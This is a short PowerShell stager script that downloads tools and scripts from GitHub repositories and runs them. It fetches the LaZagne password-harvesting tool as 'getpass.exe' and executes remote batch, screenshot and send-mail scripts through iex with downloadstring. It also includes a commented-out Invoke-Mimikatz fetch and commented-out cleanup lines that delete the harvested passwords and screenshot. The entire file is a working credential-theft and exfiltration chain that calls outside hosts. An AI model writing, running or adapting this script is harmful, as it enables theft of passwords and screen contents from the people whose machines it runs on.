$getpass = "https://github.com/gpengc/powershell/raw/master/laZagne.exe"
$command = "https://raw.githubusercontent.com/gpengc/powershell/master/command.bat"
$mimikatz = "https://raw.githubusercontent.com/gpengc/powershell2/master/Invoke-Mimikatz.ps1"
$screenshot = "https://raw.githubusercontent.com/gpengc/powershell2/master/Take-ScreenShot.ps1"
$sendmail = "https://raw.githubusercontent.com/gpengc/powershell2/master/send-mail.ps1"
#$end="https://github.com/gpengc/powershell2/raw/master/end.ps1"
$end="https://github.com/gpengc/powershell2/raw/master/end.bat"
(new-object net.webclient).downloadfile($getpass,"e:\getpass.exe")
iex((new-object net.webclient).downloadstring($command))
#(new-object net.webclient).downloadstring($mimikatz) > e:\mimikatz.ps1
iex((new-object net.webclient).downloadstring($screenshot))
iex((new-object net.webclient).downloadstring($sendmail))
stop-process -name powershell
iex((new-object net.webclient).downloadstring($end))
#sleep -s 5
#rm e:\getpass.*
#rm e:\screen.png

